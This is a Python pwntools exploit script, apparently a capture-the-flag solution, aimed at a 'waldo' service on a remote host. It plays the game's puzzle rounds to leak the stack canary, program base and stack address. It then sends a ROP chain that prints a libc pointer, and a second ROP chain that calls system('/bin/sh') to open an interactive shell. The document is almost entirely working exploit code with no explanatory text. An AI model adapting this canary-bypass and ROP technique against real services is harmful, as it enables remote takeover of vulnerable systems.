from pwn import *

host = "waldo.420blaze.in"
port = 420

r = remote(host, port)
#r = process("./waldo", raw=False)
r.recvuntil("(y/N)")
r.sendline("y")
r.recvuntil("Waldo?")
r.sendline("B"*170)
r.recvuntil("(y/N)")
r.sendline("y")
r.recvuntil("Waldo?")
r.sendline("B"*100)
r.recvuntil("(y/N)")
r.sendline("y")

cookie = -1
base = -1
stack = -1
for asdf in range(32):

    data = r.recvuntil("Waldo?")
    #print data
    deets = []
    for i in data.split("\n"):
        if "M" in i:
            if "MMMMMMMB" in i and cookie == -1:
                print i.encode("hex")
                dankbyte = i.split("\x43")[1][:1]
                base = "\x43" + dankbyte + i.split("\x43" + dankbyte)[1].split("MMMMMMMB")[0]
                cookie = i.split("MMMMMMMB")[1][:8]
                stack = i.split("MMMMMMMB")[1][8:-1]
            deets.append(i)
    x = 0
    y = 0
    for i in range(len(deets)):
        if "W" in deets[i]:
            x = i
            y = deets[i].index("W")
    #print x, y
    
    r.sendline(str(x) + " " + str(y))
cookie = int(cookie[::-1].encode("hex"), 16)
stack = int(stack[::-1].encode("hex"), 16)
base = int(base[::-1].encode("hex"), 16) - 0xc43
main = base + 0xef2
print "cookie: " + hex(cookie)
print "base:" + hex(base)
print "stack: " + hex(stack)
poprdi = base + 0x1113
poprsir15 = base + 0x1111
needtoleak = stack + 1056 #_IO_2_1_stdin_
printf = base + 0x9b0
formats = base + 0x12d5
r.sendline("A"*72 + p64(cookie) + p64(0x0) + p64(poprdi) + p64(formats) + p64(poprsir15) + p64(needtoleak) + p64(0x0) + p64(printf) + p64(main))
r.recvuntil("!")
r.recvuntil("!")
r.recvuntil("!")
libcleak = r.recvuntil("!")
print libcleak
r.recvuntil("(y/N)")
r.sendline("y")

for asdf in range(32):

    data = r.recvuntil("Waldo?")
    #print data
    deets = []
    for i in data.split("\n"):
        if "M" in i:
            deets.append(i)
    x = 0
    y = 0
    for i in range(len(deets)):
        if "W" in deets[i]:
            x = i
            y = deets[i].index("W")
    #print x, y
    
    r.sendline(str(x) + " " + str(y))

libcleak = int(libcleak.split(" ")[1].split("!")[0][::-1].encode("hex"), 16)
print "libcleak: " + hex(libcleak)

system = libcleak - 3667280
print "system: " + hex(system)
buf = base + 0x202060
gets = base + 0x9e8

r.recvuntil("name:")
print "buf: " + hex(buf)
r.sendline("A"*72 + p64(cookie) + p64(0x0) + p64(poprdi) + p64(buf) + p64(gets) + p64(poprdi) + p64(buf) + p64(system))
r.sendline("/bin/sh\x00")
r.interactive()
